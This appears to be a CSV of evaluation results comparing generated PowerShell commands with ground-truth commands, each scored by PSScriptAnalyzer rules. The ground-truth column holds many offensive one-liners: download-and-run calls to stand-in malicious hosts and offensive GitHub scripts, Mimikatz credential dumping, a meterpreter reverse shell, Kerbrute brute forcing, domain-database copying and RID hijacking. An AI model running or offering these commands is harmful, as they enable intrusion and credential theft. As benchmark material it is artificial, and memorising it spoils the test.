Answer,Answer,Ground Truth,ANSWER Rulename,ANSWER Message,ANSWER Severity,TRUTH Rulename,TRUTH Message,TRUTH Severity
"Invoke-Command -ComputerName ""RemoteSystem"" -ScriptBlock { YourCommand }","Invoke-Command -ComputerName ""RemoteSystem"" -ScriptBlock { YourCommand }",Invoke-Command -ComputerName <RemoteSystem> -ScriptBlock { <Powershell Command> },['PSAvoidUsingComputerNameHardcoded '],"[""The ComputerName parameter of cmdlet 'Invoke-Command' is hardcoded. This will expose sensitive information about the system if the script is shared. ""]",['Error'],['RedirectionNotSupported '],"[""The '<' operator is reserved for future use. ""]",['ParseError']
"IEX (Invoke-WebRequest -Uri ""YourScriptURL"").Content","IEX (Invoke-WebRequest -Uri ""YourScriptURL"").Content","Invoke-Expression -Command ""IEX(New-Object Net.WebClient).DownloadString('http://hacker.com/bad.ps1')""","['PSAvoidUsingInvokeExpression ', ' PSAvoidUsingCmdletAliases ']","['Invoke-Expression is used. Please remove Invoke-Expression from script and find other options instead. ', "" 'IEX' is an alias of 'Invoke-Expression'. Alias can introduce possible problems and make scripts hard to maintain. Please consider changing alias to its full content. ""]","['Warning ', ' Warning']",['PSAvoidUsingInvokeExpression '],['Invoke-Expression is used. Please remove Invoke-Expression from script and find other options instead. '],['Warning']
"Start-RecordingWebcam -Duration 300 -OutputPath ""C:\Path\To\Your\Video.mp4""","Start-RecordingWebcam -Duration 300 -OutputPath ""C:\Path\To\Your\Video.mp4""",Start-WebcamRecorder -RecordTime 20 -OutPath 'C:\webcam.mov',[''],[''],[''],[''],[''],['']
IEX (New-Object Net.WebClient).DownloadString('YourScriptURL'),IEX (New-Object Net.WebClient).DownloadString('YourScriptURL'),"Malicious PowerShell Command: powershell -c ""IEX (New-Object Net.WebClient).DownloadString('http://maliciouswebsite.com/maliciousscript.ps1')""","['PSAvoidUsingInvokeExpression ', ' PSAvoidUsingCmdletAliases ']","['Invoke-Expression is used. Please remove Invoke-Expression from script and find other options instead. ', "" 'IEX' is an alias of 'Invoke-Expression'. Alias can introduce possible problems and make scripts hard to maintain. Please consider changing alias to its full content. ""]","['Warning ', ' Warning']",[''],[''],['']
"Import-Module YourModule; Export-AdfsCertificates; Get-ChildItem -Path ""C:\Path\To\Your\Files"" | Where-Object { $_.Extension -eq "".txt"" } | ForEach-Object { Write-Output $_.FullName }; Write-Output ""Success""","Import-Module YourModule; Export-AdfsCertificates; Get-ChildItem -Path ""C:\Path\To\Your\Files"" | Where-Object { $_.Extension -eq "".txt"" } | ForEach-Object { Write-Output $_.FullName }; Write-Output ""Success""","Import-Module AADInternals -Force ; Export-AADIntADFSCertificates ; Get-ChildItem | Where-Object {$_ -like ""ADFS*""} ; Write-Host ""`nCertificates retrieved successfully""",[''],[''],[''],[''],[''],['']
"powershell.exe -EncodedCommand ""YourBase64EncodedPayload"" -WindowStyle Hidden","powershell.exe -EncodedCommand ""YourBase64EncodedPayload"" -WindowStyle Hidden",powershell.exe -nop -w hidden -noni -enc <Base64 Encoded Command>,[''],[''],[''],['RedirectionNotSupported '],"[""The '<' operator is reserved for future use. ""]",['ParseError']
"IEX (Invoke-WebRequest -Uri ""YourGitHubScriptURL"").Content","IEX (Invoke-WebRequest -Uri ""YourGitHubScriptURL"").Content",iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/dccuac.ps1'),"['PSAvoidUsingInvokeExpression ', ' PSAvoidUsingCmdletAliases ']","['Invoke-Expression is used. Please remove Invoke-Expression from script and find other options instead. ', "" 'IEX' is an alias of 'Invoke-Expression'. Alias can introduce possible problems and make scripts hard to maintain. Please consider changing alias to its full content. ""]","['Warning ', ' Warning']","['PSAvoidUsingInvokeExpression ', ' PSAvoidUsingCmdletAliases ']","['Invoke-Expression is used. Please remove Invoke-Expression from script and find other options instead. ', "" 'iex' is an alias of 'Invoke-Expression'. Alias can introduce possible problems and make scripts hard to maintain. Please consider changing alias to its full content. ""]","['Warning ', ' Warning']"
gci -Recurse; dir -Recurse,gci -Recurse; dir -Recurse,ls -recurse ; get-childitem -recurse ; gci -recurse,"['PSAvoidUsingCmdletAliases ', ' PSAvoidUsingCmdletAliases ']","[""'gci' is an alias of 'Get-ChildItem'. Alias can introduce possible problems and make scripts hard to maintain. Please consider changing alias to its full content. "", "" 'dir' is an alias of 'Get-ChildItem'. Alias can introduce possible problems and make scripts hard to maintain. Please consider changing alias to its full content. ""]","['Warning ', ' Warning']","['PSAvoidUsingCmdletAliases ', ' PSAvoidUsingCmdletAliases ']","[""'ls' is an alias of 'Get-ChildItem'. Alias can introduce possible problems and make scripts hard to maintain. Please consider changing alias to its full content. "", "" 'gci' is an alias of 'Get-ChildItem'. Alias can introduce possible problems and make scripts hard to maintain. Please consider changing alias to its full content. ""]","['Warning ', ' Warning']"
"powershell.exe -WindowStyle Hidden -Command ""& { IEX (Invoke-WebRequest -Uri 'YourWebsiteScriptURL').Content }""","powershell.exe -WindowStyle Hidden -Command ""& { IEX (Invoke-WebRequest -Uri 'YourWebsiteScriptURL').Content }""",powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -Command {iex (New-Object System.Net.WebClient).DownloadString('http://[malicious_website]/malicious_script.ps1')},[''],[''],[''],"['PSAvoidUsingInvokeExpression ', ' PSAvoidUsingCmdletAliases ']","['Invoke-Expression is used. Please remove Invoke-Expression from script and find other options instead. ', "" 'iex' is an alias of 'Invoke-Expression'. Alias can introduce possible problems and make scripts hard to maintain. Please consider changing alias to its full content. ""]","['Warning ', ' Warning']"
"Exploit-Jenkins -Host ""JenkinsHost"" -Port 8080 -Command ""YourNetworkStatisticsCommand""","Exploit-Jenkins -Host ""JenkinsHost"" -Port 8080 -Command ""YourNetworkStatisticsCommand""",Exploit-Jenkins -Rhost 127.0.0.1 -Port 8080 -Cmd 'cmd /c netstat -an',[''],[''],[''],[''],[''],['']
"Invoke-Command -ScriptBlock { & ""C:\Path\To\Your\Script.ps1"" }","Invoke-Command -ScriptBlock { & ""C:\Path\To\Your\Script.ps1"" }",$Invoke = {IEX (New-Object Net.WebClient).DownloadString('http://malicious.url/malicious_script.ps1')}; Invoke-Command -ScriptBlock $Invoke,[''],[''],[''],"['PSAvoidUsingInvokeExpression ', ' PSAvoidUsingCmdletAliases ']","['Invoke-Expression is used. Please remove Invoke-Expression from script and find other options instead. ', "" 'IEX' is an alias of 'Invoke-Expression'. Alias can introduce possible problems and make scripts hard to maintain. Please consider changing alias to its full content. ""]","['Warning ', ' Warning']"
"Invoke-WebRequest -Uri ""YourPUAURL"" -OutFile ""$env:TEMP\YourPUAFileName""; Start-Process ""$env:TEMP\YourPUAFileName""","Invoke-WebRequest -Uri ""YourPUAURL"" -OutFile ""$env:TEMP\YourPUAFileName""; Start-Process ""$env:TEMP\YourPUAFileName""","Invoke-WebRequest ${pua_url} -OutFile ${pua_file} ; & ""${pua_file}""",[''],[''],[''],[''],[''],['']
"Invoke-Mimikatz -Command ""YourMimikatzCommand"" -Force","Invoke-Mimikatz -Command ""YourMimikatzCommand"" -Force","powershell -exec bypass -command ""Invoke-Mimikatz -DumpCreds""",[''],[''],[''],[''],[''],['']
"Get-WmiObject -Class Win32_ComputerSystem | Export-Csv -Path ""C:\Path\To\Your\Output.csv"" -NoTypeInformation","Get-WmiObject -Class Win32_ComputerSystem | Export-Csv -Path ""C:\Path\To\Your\Output.csv"" -NoTypeInformation","powershell.exe -c ""Get-WmiObject -class win32_operatingsystem | select -property * | export-csv msdebug.log""",['PSAvoidUsingWMICmdlet '],"[""File 'buffer.ps1' uses WMI cmdlet. For PowerShell 3.0 and above, use CIM cmdlet which perform the same tasks as the WMI cmdlets. The CIM cmdlets comply with WS-Management (WSMan) standards and with the Common Information Model (CIM) standard, which enables the cmdlets to use the same techniques to manage Windows computers and those running other operating systems. ""]",['Warning'],[''],[''],['']
"powershell.exe -WindowStyle Hidden -Command ""& { IEX (Invoke-WebRequest -Uri 'YourGitHubScriptURL').Content }""","powershell.exe -WindowStyle Hidden -Command ""& { IEX (Invoke-WebRequest -Uri 'YourGitHubScriptURL').Content }""","powershell -ep bypass -w hidden -c ""IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1');""",[''],[''],[''],[''],[''],['']
"Invoke-Command -ComputerName ""RemoteSystem"" -ScriptBlock { YourCommand } -Credential (Get-Credential)","Invoke-Command -ComputerName ""RemoteSystem"" -ScriptBlock { YourCommand } -Credential (Get-Credential)",Invoke-Command -ComputerName <hostname> -ScriptBlock { < code > },['PSAvoidUsingComputerNameHardcoded '],"[""The ComputerName parameter of cmdlet 'Invoke-Command' is hardcoded. This will expose sensitive information about the system if the script is shared. ""]",['Error'],"['RedirectionNotSupported ', ' MissingFileSpecification ']","[""The '<' operator is reserved for future use. "", ' Missing file specification after redirection operator. ']","['ParseError ', ' ParseError']"
"IEX (Invoke-WebRequest -Uri ""YourScriptURL"").Content","IEX (Invoke-WebRequest -Uri ""YourScriptURL"").Content","Invoke-Expression -Command ""IEX (New-Object Net.WebClient).DownloadString('http://badwebserver.com/SysWin.ps1')""","['PSAvoidUsingInvokeExpression ', ' PSAvoidUsingCmdletAliases ']","['Invoke-Expression is used. Please remove Invoke-Expression from script and find other options instead. ', "" 'IEX' is an alias of 'Invoke-Expression'. Alias can introduce possible problems and make scripts hard to maintain. Please consider changing alias to its full content. ""]","['Warning ', ' Warning']",['PSAvoidUsingInvokeExpression '],['Invoke-Expression is used. Please remove Invoke-Expression from script and find other options instead. '],['Warning']
"mshta.exe ""C:\Path\To\Your\HTAFile.hta""","mshta.exe ""C:\Path\To\Your\HTAFile.hta""",Invoke-ATHHTMLApplication -HTAFilePath ${hta_file_path} -ScriptEngine ${script_engine} -SimulateUserDoubleClick,[''],[''],[''],[''],[''],['']
"Invoke-WebRequest -Uri ""YourFileURL"" -OutFile ""C:\Path\To\Your\DownloadedFile""","Invoke-WebRequest -Uri ""YourFileURL"" -OutFile ""C:\Path\To\Your\DownloadedFile""",Invoke-WebRequest -Url http://malicious-server.com/malicious-file.exe -OutFile C:\malicious-file.exe,[''],[''],[''],[''],[''],['']
"Invoke-RIDHijacking -Username ""alice"" -RID 500","Invoke-RIDHijacking -Username ""alice"" -RID 500",Invoke-RIDHijacking -User alice -RID 500,[''],[''],[''],[''],[''],['']
"$psbypass = New-Object PSBypass; $psbypass.Invoke-Mimikatz -Command ""YourMimikatzCommand""","$psbypass = New-Object PSBypass; $psbypass.Invoke-Mimikatz -Command ""YourMimikatzCommand""","$Bypass = New-Object System.Management.Automation.PSBypass; $Bypass.AddScript(""Invoke-Mimikatz -DumpCreds""); $Bypass.Invoke()","['UnexpectedToken ', ' UnexpectedToken ']","[""Unexpected token '-Mimikatz' in expression or statement. "", "" Unexpected token '-Command' in expression or statement. ""]","['ParseError ', ' ParseError']",[''],[''],['']
"powershell.exe -WindowStyle Hidden -Command ""& { .\Path\To\Your\Script.ps1 }""","powershell.exe -WindowStyle Hidden -Command ""& { .\Path\To\Your\Script.ps1 }""","powershell.exe -nop -w hidden -c ""IEX ((New-Object Net.WebClient).DownloadString('http://evilurl.com/evil.ps1'))"";",[''],[''],[''],[''],[''],['']
"powershell.exe -ExecutionPolicy Bypass -File ""C:\Path\To\Your\Script.ps1""","powershell.exe -ExecutionPolicy Bypass -File ""C:\Path\To\Your\Script.ps1""","powershell.exe -ExecutionPolicy Bypass -NoProfile -File ""C:\Users\attacker\script.ps1""",[''],[''],[''],[''],[''],['']
"Invoke-Mimikatz -Command ""YourMimikatzCommand"" -Force -Bypass","Invoke-Mimikatz -Command ""YourMimikatzCommand"" -Force -Bypass","powershell -ep bypass -c ""Invoke-Mimikatz""",[''],[''],[''],[''],[''],['']
"IEX (Invoke-WebRequest -Uri ""YourGitHubScriptURL"").Content","IEX (Invoke-WebRequest -Uri ""YourGitHubScriptURL"").Content",IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/DumpWCM.ps1'),"['PSAvoidUsingInvokeExpression ', ' PSAvoidUsingCmdletAliases ']","['Invoke-Expression is used. Please remove Invoke-Expression from script and find other options instead. ', "" 'IEX' is an alias of 'Invoke-Expression'. Alias can introduce possible problems and make scripts hard to maintain. Please consider changing alias to its full content. ""]","['Warning ', ' Warning']","['PSAvoidUsingInvokeExpression ', ' PSAvoidUsingCmdletAliases ']","['Invoke-Expression is used. Please remove Invoke-Expression from script and find other options instead. ', "" 'IEX' is an alias of 'Invoke-Expression'. Alias can introduce possible problems and make scripts hard to maintain. Please consider changing alias to its full content. ""]","['Warning ', ' Warning']"
"cd $env:TEMP; .\Kerbrute.exe -domaincontroller ""DomainController"" -domain ""YourDomain""","cd $env:TEMP; .\Kerbrute.exe -domaincontroller ""DomainController"" -domain ""YourDomain""",cd $env:temp ; .\kerbrute.exe bruteforce --dc ${domain_controller} -d ${Domain} $env:temp\brute_force.txt,['PSAvoidUsingCmdletAliases '],"[""'cd' is an alias of 'Set-Location'. Alias can introduce possible problems and make scripts hard to maintain. Please consider changing alias to its full content. ""]",['Warning'],['PSAvoidUsingCmdletAliases '],"[""'cd' is an alias of 'Set-Location'. Alias can introduce possible problems and make scripts hard to maintain. Please consider changing alias to its full content. ""]",['Warning']
"powershell.exe -ExecutionPolicy Bypass -File ""C:\Path\To\Your\Script.ps1""","powershell.exe -ExecutionPolicy Bypass -File ""C:\Path\To\Your\Script.ps1""",powershell.exe -ExecutionPolicy Bypass -File sysWin.ps1,[''],[''],[''],[''],[''],['']
"NinjaCopy -Source ""C:\Path\To\Your\SourceFile"" -Destination ""C:\Path\To\Your\Destination""","NinjaCopy -Source ""C:\Path\To\Your\SourceFile"" -Destination ""C:\Path\To\Your\Destination""",Invoke-NinjaCopy -Path 'C:\windows\clrt\clrt.dit' -LocalDestination 'C:\windows\temp\clrt.dit',[''],[''],[''],[''],[''],['']
"Invoke-Mimikatz -Command ""YourMimikatzCommand""; Invoke-Meterpreter -Host ""YourMeterpreterHost"" -Port 4444","Invoke-Mimikatz -Command ""YourMimikatzCommand""; Invoke-Meterpreter -Host ""YourMeterpreterHost"" -Port 4444",Invoke-Mimikatz -DumpCreds; Invoke-Shellcode -Payload windows/meterpreter/reverse_tcp -Lhost 192.168.1.1 -Lport 443,[''],[''],[''],[''],[''],['']
"Start-Process -FilePath ""nsudo.exe"" -ArgumentList ""-e 5 cmd.exe""; Stop-Process -Name ""cmd"" -Force","Start-Process -FilePath ""nsudo.exe"" -ArgumentList ""-e 5 cmd.exe""; Stop-Process -Name ""cmd"" -Force","Start-Process ${nsudo_path} -Argument ""-U:T -P:E cmd"" ; Start-Sleep -Second 5 ; Stop-Process -Name ""cmd"" -force -erroraction silentlycontinue",[''],[''],[''],[''],[''],['']
Invoke-Command -ScriptBlock { Invoke-Expression (Invoke-WebRequest -Uri 'YourScriptURL').Content },Invoke-Command -ScriptBlock { Invoke-Expression (Invoke-WebRequest -Uri 'YourScriptURL').Content },"$command = ""Invoke-Expression (New-Object Net.WebClient).DownloadString('http://maliciousurl.com/malicious.ps1')""; Invoke-Command -ScriptBlock { Invoke-Expression $using:command }",['PSAvoidUsingInvokeExpression '],['Invoke-Expression is used. Please remove Invoke-Expression from script and find other options instead. '],['Warning'],['PSAvoidUsingInvokeExpression '],['Invoke-Expression is used. Please remove Invoke-Expression from script and find other options instead. '],['Warning']
"IEX (Invoke-WebRequest -Uri ""YourScriptURL"").Content","IEX (Invoke-WebRequest -Uri ""YourScriptURL"").Content","Invoke-Expression -Command ""IEX (New-Object Net.WebClient).DownloadString('http://badwebserver.com/SysWin.ps1')""","['PSAvoidUsingInvokeExpression ', ' PSAvoidUsingCmdletAliases ']","['Invoke-Expression is used. Please remove Invoke-Expression from script and find other options instead. ', "" 'IEX' is an alias of 'Invoke-Expression'. Alias can introduce possible problems and make scripts hard to maintain. Please consider changing alias to its full content. ""]","['Warning ', ' Warning']",['PSAvoidUsingInvokeExpression '],['Invoke-Expression is used. Please remove Invoke-Expression from script and find other options instead. '],['Warning']
"powershell.exe -ExecutionPolicy Bypass -Command ""& { IEX (Invoke-WebRequest -Uri 'YourScriptURL').Content }""","powershell.exe -ExecutionPolicy Bypass -Command ""& { IEX (Invoke-WebRequest -Uri 'YourScriptURL').Content }""","powershell.exe -exec bypass -nop -c ""IEX (New-Object Net.WebClient).DownloadString('https://malicious-website.com/malicious.ps1')""",[''],[''],[''],[''],[''],['']
"Get-BrowserInfo -Username ""YourUsername"" -SearchTerm ""YourSearchTerm""","Get-BrowserInfo -Username ""YourUsername"" -SearchTerm ""YourSearchTerm""",Get-BrowserInformation -Browser All -Datatype History -UserName Luca -Search 'wikipedia',[''],[''],[''],[''],[''],['']
"& ""C:\Path\To\Your\Script.ps1"" -Action ""TurnOffWiFi""","& ""C:\Path\To\Your\Script.ps1"" -Action ""TurnOffWiFi""",.\wifi.ps1 -Off,[''],[''],[''],[''],[''],['']
"powershell.exe -ExecutionPolicy Bypass -Command ""& { IEX (Invoke-WebRequest -Uri 'YourScriptURL').Content }""","powershell.exe -ExecutionPolicy Bypass -Command ""& { IEX (Invoke-WebRequest -Uri 'YourScriptURL').Content }""","powershell.exe -ep bypass -nop -c ""IEX (New-Object Net.WebClient).DownloadString('http://exploitingurl.com/execKern.ps1')""",[''],[''],[''],[''],[''],['']
"powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command ""& { IEX (Invoke-WebRequest -Uri 'YourScriptURL').Content }""","powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command ""& { IEX (Invoke-WebRequest -Uri 'YourScriptURL').Content }""",powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command {Invoke-Expression (New-Object Net.WebClient).DownloadString('http://malicious-server.com/malicious-script.ps1')},[''],[''],[''],['PSAvoidUsingInvokeExpression '],['Invoke-Expression is used. Please remove Invoke-Expression from script and find other options instead. '],['Warning']
"tar -cvzf ""C:\Path\To\Your\Archive.tar.gz"" ""C:\Path\To\Your\GitDirectory"" | Write-Output","tar -cvzf ""C:\Path\To\Your\Archive.tar.gz"" ""C:\Path\To\Your\GitDirectory"" | Write-Output",tar -czf ${host.dir.git}.tar.gz -C ${host.dir.git} *; Write-Host ${host.dir.git}.tar.gz; exit 0;,[''],[''],[''],[''],[''],['']
"Get-Content ""C:\Path\To\Your\File.txt""; Get-Hotfix | Format-Table; Write-Output ""Success""","Get-Content ""C:\Path\To\Your\File.txt""; Get-Hotfix | Format-Table; Write-Output ""Success""","Get-Content computers.txt | Get-WinUpdates | Format-Table PC,Date,Operation,Status,Title,KB,PC -Wrap -auto",[''],[''],[''],[''],[''],['']
"powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command ""& { IEX (Invoke-WebRequest -Uri 'YourGitHubScriptURL').Content }""","powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command ""& { IEX (Invoke-WebRequest -Uri 'YourGitHubScriptURL').Content }""",powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'),[''],[''],[''],[''],[''],['']
netsh interface portproxy add v4tov4 listenport=YourListenPort connectaddress=YourConnectAddress connectport=YourConnectPort,netsh interface portproxy add v4tov4 listenport=YourListenPort connectaddress=YourConnectAddress connectport=YourConnectPort,netsh interface portproxy add v4tov4 listenport=${listen_port} connectport=${connect_port} connectaddress=${connect_address},[''],[''],[''],[''],[''],['']
"[System.Environment]::SetEnvironmentVariable(""YourVariable"", ""YourValue""); Start-Sleep -Seconds 1","[System.Environment]::SetEnvironmentVariable(""YourVariable"", ""YourValue""); Start-Sleep -Seconds 1",$env:COR_ENABLE_PROFILING = 1 ; $env:COR_PROFILER = '${cls_guid}' ; $env:COR_PROFILER_PATH = '${filename}' ; POWERSHELL -c 'Start-Sleep 1',[''],[''],[''],[''],[''],['']
"Invoke-RIDHijacking -Username ""YourUsername"" -RID ""YourRID"" -Password ""YourPassword"" -EnableAttack","Invoke-RIDHijacking -Username ""YourUsername"" -RID ""YourRID"" -Password ""YourPassword"" -EnableAttack",Invoke-RIDHijacking -User alice -RID 500 -Password Password1 -Enable,[''],[''],[''],[''],[''],['']
Get-WmiObject -Class Win32_Group,Get-WmiObject -Class Win32_Group,Get-WMIObject Win32_Group,['PSAvoidUsingWMICmdlet '],"[""File 'buffer.ps1' uses WMI cmdlet. For PowerShell 3.0 and above, use CIM cmdlet which perform the same tasks as the WMI cmdlets. The CIM cmdlets comply with WS-Management (WSMan) standards and with the Common Information Model (CIM) standard, which enables the cmdlets to use the same techniques to manage Windows computers and those running other operating systems. ""]",['Warning'],['PSAvoidUsingWMICmdlet '],"[""File 'buffer.ps1' uses WMI cmdlet. For PowerShell 3.0 and above, use CIM cmdlet which perform the same tasks as the WMI cmdlets. The CIM cmdlets comply with WS-Management (WSMan) standards and with the Common Information Model (CIM) standard, which enables the cmdlets to use the same techniques to manage Windows computers and those running other operating systems. ""]",['Warning']
"Get-Date -Format ""YourDateFormat""","Get-Date -Format ""YourDateFormat""",Get-Date -UFormat '+%Y-%m-%dT%H:%M:%SZ',[''],[''],[''],[''],[''],['']
"python.exe ""C:\Path\To\Your\Script.py"" -filename ""YourFileName"" -ip ""YourIPAddress""","python.exe ""C:\Path\To\Your\Script.py"" -filename ""YourFileName"" -ip ""YourIPAddress""",python ${file_name} -i ${IP},[''],[''],[''],[''],[''],['']
"powershell.exe -ExecutionPolicy Bypass -File ""C:\Path\To\Your\Script.ps1""","powershell.exe -ExecutionPolicy Bypass -File ""C:\Path\To\Your\Script.ps1""",powershell.exe -ExecutionPolicy Bypass -File C:\Users\User\somecode.ps1,[''],[''],[''],[''],[''],['']
"wscript.exe ""C:\Path\To\Your\Script.vbs"" -param1 ""Value1"" -param2 ""Value2""","wscript.exe ""C:\Path\To\Your\Script.vbs"" -param1 ""Value1"" -param2 ""Value2""",Invoke-WScriptBypass -payload 'powershell.exe -ep Bypass -WindowStyle Hidden -enc <base64>',[''],[''],[''],[''],[''],['']
"$mimikatzCommand = [System.Text.Encoding]::Unicode.GetBytes(""YourMimikatzCommand""); [System.Convert]::ToBase64String($mimikatzCommand)","$mimikatzCommand = [System.Text.Encoding]::Unicode.GetBytes(""YourMimikatzCommand""); [System.Convert]::ToBase64String($mimikatzCommand)","$payload = [System.Text.Encoding]::Unicode.GetBytes(""Invoke-Mimikatz"")",[''],[''],[''],['PSUseDeclaredVarsMoreThanAssignments '],"[""The variable 'payload' is assigned but never used. ""]",['Warning']
"Invoke-TokenManipulation -CreateProcess ""cmd.exe"" -ThreadID ""YourThreadID""","Invoke-TokenManipulation -CreateProcess ""cmd.exe"" -ThreadID ""YourThreadID""",Invoke-TokenManipulation -CreateProcess 'cmd.exe' -ThreadId 500,[''],[''],[''],[''],[''],['']
Invoke-Inveigh -Analysis -Attacks,Invoke-Inveigh -Analysis -Attacks,./Inveigh.ps1;Invoke-Inveigh -IP 192.168.1.10,[''],[''],[''],[''],[''],['']
"python.exe ""C:\Path\To\Your\Script.py"" -filename ""YourFileName"" -host ""YourIPAddress""","python.exe ""C:\Path\To\Your\Script.py"" -filename ""YourFileName"" -host ""YourIPAddress""",python ${filename} -i ${host_ip},[''],[''],[''],[''],[''],['']
"Invoke-Mimikatz -Command ""YourMimikatzCommand"" -Force -Bypass","Invoke-Mimikatz -Command ""YourMimikatzCommand"" -Force -Bypass","powershell.exe -exec bypass -c ""Invoke-Mimikatz""",[''],[''],[''],[''],[''],['']
